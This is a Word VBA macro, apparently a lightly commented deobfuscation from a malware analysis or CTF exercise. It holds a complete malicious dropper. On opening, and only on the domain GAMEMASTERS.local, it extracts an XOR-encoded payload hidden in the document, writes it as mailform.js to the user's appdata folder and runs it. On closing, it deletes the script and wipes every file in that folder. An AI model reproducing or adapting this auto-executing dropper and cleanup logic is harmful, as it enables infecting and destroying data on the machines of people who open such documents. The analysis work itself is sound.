Public file_name As String
Public appData_folder As String


Function xorring(given_string() As Byte, length As Long) As Boolean
    Dim xor_key As Byte
    xor_key = 45
    For i = 0 To length - 1
        given_string(i) = given_string(i) Xor xor_key
        xor_key = ((xor_key Xor 99) Xor (i Mod 254))
    Next i
    xorring = True
End Function

Sub AutoClose() 'delete the js script'
    On Error Resume Next
    Kill file_name
    On Error Resume Next
    Set fileSystemObj = CreateObject("Scripting.FileSystemObject")
    fileSystemObj.DeleteFile appData_folder & "\*.*", True
    Set fileSystemObj = Nothing
End Sub

Sub AutoOpen()
    On Error GoTo exit_label
    Dim chkDomain As String
    Dim strUserDomain As String
    chkDomain = "GAMEMASTERS.local"
    strUserDomain = Environ$("UserDomain")
    If chkDomain <> strUserDomain Then

    Else
        ' Define the variables'
        Dim IOFile_ActiveDocument
        Dim ActiveDocument_length As Long
        Dim length As Long
        Dim ActiveDocument_content() As Byte
        Dim _ActiveDocument_content As String
        Dim mathced_AD, matched_ActiveDocument_content
        Dim regex_Obj
        Dim mathced_AD_FirstIndex
        Dim MAD_FirstIndex() As Byte
        Dim MAD_FirstIndex_size As Long
        Dim IOFile_mailform

        MAD_FirstIndex_size = 13082
        ReDim MAD_FirstIndex(MAD_FirstIndex_size) 'set size'

        ActiveDocument_length = FileLen(ActiveDocument.FullName)
        IOFile_ActiveDocument = FreeFile
        Open (ActiveDocument.FullName) For Binary As #IOFile_ActiveDocument
        ReDim ActiveDocument_content(ActiveDocument_length) 'set size', likely get all the content of the file'
        Get #IOFile_ActiveDocument, 1, ActiveDocument_content
        _ActiveDocument_content = StrConv(ActiveDocument_content, vbUnicode)

        ' searching last index of matched string pattern in the file content and get the first index of the matched string pattern in the file content'
        Set regex_Obj = CreateObject("vbscript.regexp")
        regex_Obj.Pattern = "sWcDWp36x5oIe2hJGnRy1iC92AcdQgO8RLioVZWlhCKJXHRSqO450AiqLZyLFeXYilCtorg0p3RdaoPa"
        Set matched_ActiveDocument_content = regex_Obj.Execute(_ActiveDocument_content)
        If matched_ActiveDocument_content.Count = 0 Then
            GoTo exit_label
        End If
        ' this the searcher last index of matched string pattern in the file content and get the first index of the matched string pattern in the file content'
        For Each mathced_AD In matched_ActiveDocument_content
            mathced_AD_FirstIndex = mathced_AD.FirstIndex
        Exit For
        Next

        ' get the content of the file from the first index of the matched string pattern in the file content to the end of the file content'
        Get #IOFile_ActiveDocument, mathced_AD_FirstIndex + 81, MAD_FirstIndex
        If Not xorring(MAD_FirstIndex(), MAD_FirstIndex_size + 1) Then
            GoTo exit_label
        End If

        ' get the appdata folder'
        appData_folder = Environ("appdata") & "\Microsoft\Windows"
        Set fileSystemObj = CreateObject("Scripting.FileSystemObject")
        If Not fileSystemObj.FolderExists(appData_folder) Then
            appData_folder = Environ("appdata")
        End If
        Set fileSystemObj = Nothing 'cleared the object'

        ' write the content of the file to the mailform.js file'
        IOFile_mailform = FreeFile
        file_name = appData_folder & "\" & "mailform.js"
        Open (file_name) For Binary As #IOFile_mailform
        Put #IOFile_mailform, 1, MAD_FirstIndex
        Close #IOFile_mailform
        Erase MAD_FirstIndex

        ' execute the mailform.js file'
        Set executor = CreateObject("WScript.Shell")
        executor.Run """" + file_name + """" + " vF8rdgMHKBrvCoCp0ulm"
        ActiveDocument.Save
        Exit Sub 'exit the sub, this is like a return statement'

exit_label:
        Close #IOFile_mailform
        ActiveDocument.Save
    End If
End Sub